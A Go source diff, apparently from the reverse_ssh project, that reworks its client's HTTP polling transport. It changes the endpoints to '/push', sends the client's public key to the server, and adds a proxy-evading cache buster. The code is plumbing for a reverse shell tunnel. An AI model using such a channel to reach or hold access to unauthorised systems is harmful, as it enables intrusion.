@@ -2,24 +2,30 @@ package client
 
 import (
 	"bytes"
+	"encoding/hex"
 	"errors"
 	"io"
 	"log"
+	mathrand "math/rand"
 	"net"
 	"net/http"
+	"strconv"
 	"time"
 
+	"github.com/NHAS/reverse_ssh/internal/client/keys"
 	"github.com/NHAS/reverse_ssh/pkg/mux"
 )
 
 type HTTPConn struct {
-	queryPath string
-	ID        string
-	address   string
+	ID      string
+	address string
 
 	done chan interface{}
 
 	readBuffer *mux.SyncBuffer
+
+	// Cache buster for middleware proxies
+	start int
 
 	client *http.Client
 }
@@ -30,6 +36,7 @@ func NewHTTPConn(address string, connector func() (net.Conn, error)) (*HTTPConn,
 		done:       make(chan interface{}),
 		readBuffer: mux.NewSyncBuffer(8096),
 		address:    address,
+		start:      mathrand.Int(),
 	}
 
 	result.client = &http.Client{
@@ -37,16 +44,20 @@ func NewHTTPConn(address string, connector func() (net.Conn, error)) (*HTTPConn,
 			Dial: func(network, addr string) (net.Conn, error) {
 				return connector()
 			},
-			MaxConnsPerHost:   1,
-			MaxIdleConns:      -1,
-			DisableKeepAlives: true,
 		},
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
 			return http.ErrUseLastResponse
 		},
 	}
 
-	resp, err := result.client.Head(address + "/download")
+	s, err := keys.GetPrivateKey()
+	if err != nil {
+		return nil, err
+	}
+
+	publicKeyBytes := s.PublicKey().Marshal()
+
+	resp, err := result.client.Head(address + "/push?key=" + hex.EncodeToString(publicKeyBytes))
 	if err != nil {
 		return nil, err
 	}
@@ -55,12 +66,6 @@ func NewHTTPConn(address string, connector func() (net.Conn, error)) (*HTTPConn,
 	if resp.StatusCode != http.StatusTemporaryRedirect {
 		return nil, errors.New("server refused to open a session for us")
 	}
-
-	if resp.Header.Get("Location") == "" {
-		return nil, errors.New("server sent invalid query location")
-	}
-
-	result.queryPath = resp.Header.Get("Location")
 
 	found := false
 	for _, cookie := range resp.Cookies() {
@@ -89,7 +94,7 @@ func (c *HTTPConn) startReadLoop() {
 		default:
 		}
 
-		resp, err := c.client.Get(c.address + "/download?item=" + c.ID)
+		resp, err := c.client.Get(c.address + "/push/" + strconv.Itoa(c.start) + "?id=" + c.ID)
 		if err != nil {
 			log.Println("error getting data: ", err)
 			c.Close()
@@ -104,6 +109,9 @@ func (c *HTTPConn) startReadLoop() {
 		}
 
 		resp.Body.Close()
+
+		// Cache buster for middleware proxies
+		c.start++
 
 		time.Sleep(10 * time.Millisecond)
 
@@ -129,7 +137,7 @@ func (c *HTTPConn) Write(b []byte) (n int, err error) {
 	default:
 	}
 
-	resp, err := c.client.Post(c.address+"/download?item="+c.ID, "application/octet-stream", bytes.NewBuffer(b))
+	resp, err := c.client.Post(c.address+"/push?id="+c.ID, "application/octet-stream", bytes.NewBuffer(b))
 	if err != nil {
 		c.Close()
 		return 0, err
